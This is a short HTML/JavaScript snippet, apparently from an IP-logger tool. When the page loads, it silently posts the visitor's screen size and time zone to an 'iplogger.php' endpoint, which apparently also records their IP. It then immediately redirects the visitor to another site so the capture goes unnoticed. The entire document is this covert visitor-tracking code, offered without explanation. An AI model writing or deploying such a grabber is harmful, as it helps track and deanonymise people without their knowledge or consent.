<script>
var webhook = "Youtube.com";
var redirect = "https://graysuit.github.io";
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() { 
    if (this.readyState == 4) {
        window.location = redirect;
    } 
};
xhr.open('POST', 'iplogger.php', true);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send('url=' + webhook + "&Width=" + window.screen.width + "&Height=" + window.screen.height + "&TimeZone=" + Intl.DateTimeFormat().resolvedOptions().timeZone);
</script>
